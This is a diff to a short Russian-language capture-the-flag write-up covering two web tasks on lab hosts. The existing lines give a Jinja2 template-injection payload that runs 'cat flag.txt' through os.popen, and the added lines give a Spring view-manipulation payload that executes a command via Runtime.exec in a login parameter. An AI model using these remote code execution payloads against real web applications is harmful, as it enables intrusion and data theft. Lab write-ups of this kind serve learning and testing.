@@ -36,3 +36,11 @@ web3
 
 9. Если сервер вывел ID файлов, то он может вывести и содержимое файлов. Нам необходимо найти флаг, поэтому введем команду: http://192.168.12.11:8001//flag?name={{%20self.__init__.__globals__.__builtins__.__import__(%27os%27).popen(%27cat%20flag.txt%27).read()%20}}; и получим флаг: ![Screenshot_2024-03-21_10_45_13](https://github.com/KaaaoooK/KaaaoooK/assets/164244108/909398a7-b9c5-4673-8a77-6948c6060872)
  
+web2
+
+Используем Spring view manipulation(https://lohitaksh-nandan.gitbook.io/cheat-sheets/framework/spring/view-manipulation)
+
+Введем команду http://192.168.12.13:8090/login?password=__${new%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22password%22).getInputStream()).next()}__::.x
+
+Перезаходим на http://192.168.12.13:8090/login?password=password и вводим в поле пароля password 
+Получаем флаг. Профит
